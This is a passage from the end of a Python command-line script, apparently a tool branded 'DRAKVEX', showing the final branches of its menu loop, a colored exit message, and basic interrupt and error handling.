                run_device_generator()
            elif choice == '6':
                menu_show_paths()
            elif choice == '0':
                print()
                print(f"   {hex_ansi('#7a0000')}{_BRT}DRAKVEX offline.{_RST}  "
                      f"{_DIM}\u29d7 @drakvexxx{_RST}")
                return
        except KeyboardInterrupt:
            print()
            log('WARNING', 'interrupted')
            return
        except Exception as e:
            log('ERROR', f'{type(e).__name__}: {e}')
            press_enter()


if __name__ == '__main__':
    main()